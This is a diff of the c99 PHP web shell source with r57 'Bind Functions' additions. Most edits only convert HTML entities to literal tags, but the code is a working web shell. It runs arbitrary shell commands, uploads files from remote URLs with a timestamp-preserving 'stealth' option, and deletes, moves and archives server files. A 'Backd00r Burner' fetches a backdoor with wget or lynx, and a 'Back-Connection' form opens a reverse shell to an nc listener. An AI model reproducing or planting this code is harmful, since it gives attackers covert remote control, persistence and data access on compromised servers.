-     while(file_exists($uploadpath.$destin)) {if ($i &gt; 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
+     while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
    }
-   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "&lt;b&gt;Incorect url!&lt;/b&gt;&lt;br&gt;";}
+   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
    else
    {
     $st = getmicrotime();
     $content = @file_get_contents($uploadurl);
     $dt = round(getmicrotime()-$st,4);
-    if (!$content) {$uploadmess .=  "Can't download file!&lt;br&gt;";}
+    if (!$content) {$uploadmess .=  "Can't download file!<br>";}
     else
     {
      if ($filestealth) {$stat = stat($uploadpath.$destin);}
      $fp = fopen($uploadpath.$destin,"w");
-     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!&lt;br&gt;";}
+     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
      else
      {
       fwrite($fp,$content,strlen($content));
@@ -2081,19 +2081,19 @@ if (!empty($submit))
 }
 if ($miniform)
 {
-  echo "&lt;b&gt;".$uploadmess."&lt;/b&gt;";
+  echo "<b>".$uploadmess."</b>";
   $act = "ls";
 }
 else
 {
-  echo "&lt;b&gt;File upload:&lt;/b&gt;&lt;br&gt;&lt;b&gt;".$uploadmess."&lt;/b&gt;&lt;form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST&gt;
-Select file on your local computer: &lt;input name=\"uploadfile\" type=\"file\"&gt;&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or&lt;br&gt;
-Input URL: &lt;input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"&gt;&lt;br&gt;&lt;br&gt;
-Save this file dir: &lt;input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;
-File-name (auto-fill): &lt;input name=uploadfilename size=25&gt;&lt;br&gt;&lt;br&gt;
-&lt;input type=checkbox name=uploadautoname value=1 id=df4&gt;&nbsp;convert file name to lovercase&lt;br&gt;&lt;br&gt;
-&lt;input type=submit name=submit value=\"Upload\"&gt;
-&lt;/form&gt;";
+  echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST>
+Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
+Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
+Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
+File-name (auto-fill): <input name=uploadfilename size=25><br><br>
+<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
+<input type=submit name=submit value=\"Upload\">
+</form>";
 }
 }
 if ($act == "delete")
@@ -2103,38 +2103,38 @@ foreach ($actbox as $v)
 {
   $result = FALSE;
   $result = fs_rmobj($v);
-  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."&lt;br&gt;";}
+  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
 }
-if (!empty($delerr)) {echo "&lt;b&gt;Deleting with errors:&lt;/b&gt;&lt;br&gt;".$delerr;}
+if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 $act = "ls";
 }
 if (!$usefsbuff)
 {
-if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "&lt;center&gt;&lt;b&gt;Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.&lt;/center&gt;";}
+if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
 }
 else
 {
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
-elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
+elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
   $psterr = "";
-  foreach($sess_data["copy"] as $k=&gt;$v)
+  foreach($sess_data["copy"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
+   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
    if ($copy_unset) {unset($sess_data["copy"][$k]);}
   }
-  foreach($sess_data["cut"] as $k=&gt;$v)
+  foreach($sess_data["cut"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
+   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
    unset($sess_data["cut"][$k]);
   }
   c99_sess_put($sess_data);
-  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
+  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
   $act = "ls";
 }
 elseif ($actarcbuff)
@@ -2160,36 +2160,36 @@ elseif ($actarcbuff)
   chdir($d);
   $ret = myshellexec($cmdline);
   chdir($tmp);
-  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!&lt;br&gt;";}
+  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
   $ret = str_replace("\r\n","\n",$ret);
   $ret = explode("\n",$ret);
-  if ($copy_unset) {foreach($sess_data["copy"] as $k=&gt;$v) {unset($sess_data["copy"][$k]);}}
-  foreach($sess_data["cut"] as $k=&gt;$v)
+  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
+  foreach($sess_data["cut"] as $k=>$v)
   {
    if (in_array($v,$ret)) {fs_rmobj($v);}
    unset($sess_data["cut"][$k]);
   }
   c99_sess_put($sess_data);
-  if (!empty($arcerr)) {echo "&lt;b&gt;Archivation errors:&lt;/b&gt;&lt;br&gt;".$arcerr;}
+  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
   $act = "ls";
 }
 elseif ($actpastebuff)
 {
   $psterr = "";
-  foreach($sess_data["copy"] as $k=&gt;$v)
+  foreach($sess_data["copy"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
+   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
    if ($copy_unset) {unset($sess_data["copy"][$k]);}
   }
-  foreach($sess_data["cut"] as $k=&gt;$v)
+  foreach($sess_data["cut"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
+   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
    unset($sess_data["cut"][$k]);
   }
   c99_sess_put($sess_data);
-  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
+  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
   $act = "ls";
 }
 }
@@ -2202,7 +2202,7 @@ else
 @chdir($chdir);
 if (!empty($submit))
 {
-  echo "&lt;b&gt;Result of execution this command&lt;/b&gt;:&lt;br&gt;";
+  echo "<b>Result of execution this command</b>:<br>";
   $olddir = realpath(".");
   @chdir($d);
   $ret = myshellexec($cmd);
@@ -2210,19 +2210,19 @@ if (!empty($submit))
   if ($cmd_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
-   if ($rows &lt; 10) {$rows = 10;}
-   echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
+   if ($rows < 10) {$rows = 10;}
+   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
-  else {echo $ret."&lt;br&gt;";}
+  else {echo $ret."<br>";}
   @chdir($olddir);
 }
-else {echo "&lt;b&gt;Execution command&lt;/b&gt;"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
-echo "&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=cmd&gt;&lt;textarea name=cmd cols=122 rows=10&gt;".htmlspecialchars($cmd)."&lt;/textarea&gt;&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
+else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
+echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
 }
 }
 if ($act == "ls")
 {
-if (count($ls_arr) &gt; 0) {$list = $ls_arr;}
+if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
   $list = array();
@@ -2233,7 +2233,7 @@ else
   }
   else {}
 }
-if (count($list) == 0) {echo "&lt;center&gt;&lt;b&gt;Can't open folder (".htmlspecialchars($d).")!&lt;/b&gt;&lt;/center&gt;";}
+if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {
   //Building array
@@ -2274,23 +2274,23 @@ else
     $i++;
    }
    $row = array();
-   $row[] = "&lt;b&gt;Name&lt;/b&gt;";
-   $row[] = "&lt;b&gt;Size&lt;/b&gt;";
-   $row[] = "&lt;b&gt;Modify&lt;/b&gt;";
+   $row[] = "<b>Name</b>";
+   $row[] = "<b>Size</b>";
+   $row[] = "<b>Modify</b>";
    if (!$win)
-  {$row[] = "&lt;b&gt;Owner/Group&lt;/b&gt;";}
-   $row[] = "&lt;b&gt;Perms&lt;/b&gt;";
-   $row[] = "&lt;b&gt;Action&lt;/b&gt;";
+  {$row[] = "<b>Owner/Group</b>";}
+   $row[] = "<b>Perms</b>";
+   $row[] = "<b>Action</b>";
    $parsesort = parsesort($sort);
    $sort = $parsesort[0].$parsesort[1];
    $k = $parsesort[0];
    if ($parsesort[1] != "a") {$parsesort[1] = "d";}
-   $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\"&gt;";
-   $y .= "&lt;img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"&gt;&lt;/a&gt;";
+   $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
+   $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
    $row[$k] .= $y;
-   for($i=0;$i&lt;count($row)-1;$i++)
+   for($i=0;$i<count($row)-1;$i++)
    {
-    if ($i != $k) {$row[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\"&gt;".$row[$i]."&lt;/a&gt;";}
+    if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
    }
    $v = $parsesort[0];
    usort($objects["folders"], "tabsort");
@@ -2317,20 +2317,20 @@ else
     if ($disp_fullpath) {$disppath = $v;}
     else {$disppath = $o;}
     $disppath = str2mini($disppath,60);
-    if (in_array($v,$sess_data["cut"])) {$disppath = "&lt;strike&gt;".$disppath."&lt;/strike&gt;";}
-    elseif (in_array($v,$sess_data["copy"])) {$disppath = "&lt;u&gt;".$disppath."&lt;/u&gt;";}
+    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
+    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
     foreach ($regxp_highlight as $r)
     {
      if (ereg($r[0],$o))
      {
-      if ((!is_numeric($r[1])) or ($r[1] &gt; 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
+      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
       else
       {
        $r[1] = round($r[1]);
        $isdir = is_dir($v);
        if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
        {
-        if (empty($r[2])) {$r[2] = "&lt;b&gt;"; $r[3] = "&lt;/b&gt;";}
+        if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
         $disppath = $r[2].$disppath.$r[3];
         if ($r[4]) {break;}
        }
@@ -2343,26 +2343,26 @@ else
     $row = array();
     if ($o == ".")
     {
-     $row[] = "&lt;img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"&gt;".$o."&lt;/a&gt;";
+     $row[] = "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
      $row[] = "LINK";
     }
     elseif ($o == "..")
     {
-     $row[] = "&lt;img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"&gt;".$o."&lt;/a&gt;";
+     $row[] = "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
      $row[] = "LINK";
     }
     elseif (is_dir($v))
     {
      if (is_link($v))
      {
-      $disppath .= " =&gt; ".readlink($v);
+      $disppath .= " => ".readlink($v);
       $type = "LINK";
-      $row[] =  "&lt;img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;[".$disppath."]&lt;/a&gt;";
+      $row[] =  "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
      }
      else
      {
       $type = "DIR";
-      $row[] =  "&lt;img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;[".$disppath."]&lt;/a&gt;";
+      $row[] =  "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
       }
      $row[] = $type;
     }
@@ -2372,16 +2372,16 @@ else
      $c = count($ext)-1;
      $ext = $ext[$c];
      $ext = strtolower($ext);
-     $row[] =  "&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\"&gt;".$disppath."&lt;/a&gt;";
+     $row[] =  "<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>";
      $row[] = view_size($a[1]);
     }
     $row[] = date("d.m.Y H:i:s",$a[2]);
     if (!$win) {$row[] = $a[3];}
-    $row[] = "&lt;a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"&gt;&lt;b&gt;".view_perms_color($v)."&lt;/b&gt;&lt;/a&gt;";
-    if ($o == ".") {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\"&gt;"; $i--;}
-    else {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\"&gt;";}
-    if (is_dir($v)) {$row[] = "&lt;a href=\"".$surl."act=d&d=".$uv."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"&gt;&lt;/a&gt;&nbsp;".$checkbox;}
-    else {$row[] = "&lt;a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"&gt;&lt;/a&gt;&nbsp;".$checkbox;}
+    $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
+    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
+    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
+    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;}
+    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;}
     if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
     elseif (is_link($v)) {$tab["links"][] = $row;}
     elseif (is_dir($v)) {$tab["folders"][] = $row;}
@@ -2391,20 +2391,20 @@ else
   }
   // Compiling table
   $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
-  echo "&lt;center&gt;&lt;b&gt;Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;TABLE cellSpacing=0 cellPadding=0 width=100% bgcolor=#000000 borderColorLight=#433333 border=0&gt;&lt;form action=\"".$surl."\" method=POST name=\"ls_form\"&gt;&lt;input type=hidden name=act value=".$dspact."&gt;&lt;input type=hidden name=d value=".$d."&gt;";
+  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgcolor=#000000 borderColorLight=#433333 border=0><form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
   foreach($table as $row)
   {
-   echo "&lt;tr&gt;\r\n";
-   foreach($row as $v) {echo "&lt;td&gt;".$v."&lt;/td&gt;\r\n";}
-   echo "&lt;/tr&gt;\r\n";
+   echo "<tr>\r\n";
+   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
+   echo "</tr>\r\n";
   }
-  echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;
-  &lt;script&gt;
+  echo "</table><hr size=\"1\" noshade><p align=\"right\">
+  <script>
   function ls_setcheckboxall(status)
   {
    var id = 1;
    var num = ".(count($table)-2).";
-   while (id &lt;= num)
+   while (id <= num)
    {
     document.getElementById('actbox'+id).checked = status;
     id++;
@@ -2414,30 +2414,30 @@ else
   {
    var id = 1;
    var num = ".(count($table)-2).";
-   while (id &lt;= num)
+   while (id <= num)
    {
     document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
     id++;
    }
   }
-  &lt;/script&gt;
-  &lt;input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\"&gt;&nbsp;&nbsp;&lt;input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\"&gt;  
-  &lt;b&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;";
-  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) &gt; 0 and ($usefsbuff))
+  </script>
+  <input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">  
+  <b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
+  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
   {
-   echo "&lt;input type=submit name=actarcbuff value=\"Pack buffer to archive\"&gt;&nbsp;&lt;input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actpastebuff\" value=\"Paste\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actemptybuff\" value=\"Empty buffer\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
+   echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
   }
-  echo "&lt;select name=act&gt;&lt;option value=\"".$act."\"&gt;With selected:&lt;/option&gt;";
-  echo "&lt;option value=delete".($dspact == "delete"?" selected":"")."&gt;Delete&lt;/option&gt;";
-  echo "&lt;option value=chmod".($dspact == "chmod"?" selected":"")."&gt;Change-mode&lt;/option&gt;";
+  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
+  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
+  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
   if ($usefsbuff)
   {
-   echo "&lt;option value=cut".($dspact == "cut"?" selected":"")."&gt;Cut&lt;/option&gt;";
-   echo "&lt;option value=copy".($dspact == "copy"?" selected":"")."&gt;Copy&lt;/option&gt;";
-   echo "&lt;option value=unselect".($dspact == "unselect"?" selected":"")."&gt;Unselect&lt;/option&gt;";
+   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
+   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
+   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
   }
-  echo "&lt;/select&gt;&nbsp;&lt;input type=submit value=\"Confirm\"&gt;&lt;/p&gt;";
-  echo "&lt;/form&gt;";
+  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
+  echo "</form>";
 }
 }
 if ($act == "tools")
@@ -2445,38 +2445,36 @@ if ($act == "tools")
 ?>
 
 
-&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;Bind Functions By r57  &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-    &lt;div align="center"&gt;
-    &lt;/div&gt;
-&lt;form action="<?php echo $surl; ?>"&gt;
-&lt;b&gt;Bind With Backd00r Burner&lt;/b&gt;&lt;/br&gt;&lt;form action="<?php echo $surl;?>"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;select size=\"1\" name=dolma&gt;&lt;option value="wgetcan"&gt;Use Wget&lt;/option&gt;&lt;option value="lynxcan"&gt;Use lynx -dump&lt;/option&gt;&lt;option value="freadcan"&gt;Use Fread&lt;/option&gt;&lt;/select&gt;&lt;/br&gt;&lt;/br&gt;&lt;input type="submit" value="Burn it bAby"&gt;&lt;/form&gt;
-    &lt;/td&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-   &lt;center&gt;
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Bind Functions By r57  </b></a> ::</b></p></td></tr>
+<tr>
+  <td width="50%" height="83" valign="top"><center>
+    <div align="center">
+    </div>
+<form action="<?php echo $surl; ?>">
+<b>Bind With Backd00r Burner</b></br><form action="<?php echo $surl;?>"><input type=hidden name=act value=tools><select size=\"1\" name=dolma><option value="wgetcan">Use Wget</option><option value="lynxcan">Use lynx -dump</option><option value="freadcan">Use Fread</option></select></br></br><input type="submit" value="Burn it bAby"></form>
+    </td>
+  <td width="50%" height="83" valign="top"><center>
+   <center>
   
-   &lt;b&gt;Back-Connection :&lt;/b&gt;&lt;/br&gt;&lt;form action="<?php echo $surl;?>"&gt; &lt;b&gt;Ip (default is your ip) :&lt;/br&gt; &lt;/b&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type="text" name="ipi" value="<?echo getenv('REMOTE_ADDR');?>"&gt;&lt;/br&gt;&lt;b&gt;Port:&lt;/br&gt;&lt;/b&gt;&lt;input type="text" name="pipi" value="4392"&gt;&lt;/br&gt;&lt;input type="submit" value="C0nnect -&gt;"&gt;&lt;/br&gt;&lt;/form&gt;
-Click "Connect" only after open port for it. You should use NetCat&copy;, run "&lt;b&gt;nc -l -n -v -p <?php echo $bc_port; ?>&lt;/b&gt;"!&lt;br&gt;&lt;br&gt;
+   <b>Back-Connection :</b></br><form action="<?php echo $surl;?>"> <b>Ip (default is your ip) :</br> </b><input type=hidden name=act value=tools><input type="text" name="ipi" value="<?echo getenv('REMOTE_ADDR');?>"></br><b>Port:</br></b><input type="text" name="pipi" value="4392"></br><input type="submit" value="C0nnect ->"></br></form>
+Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>
    
-   &lt;/center&gt;
-    &lt;/td&gt;
-&lt;/tr&gt;&lt;/TABLE&gt;
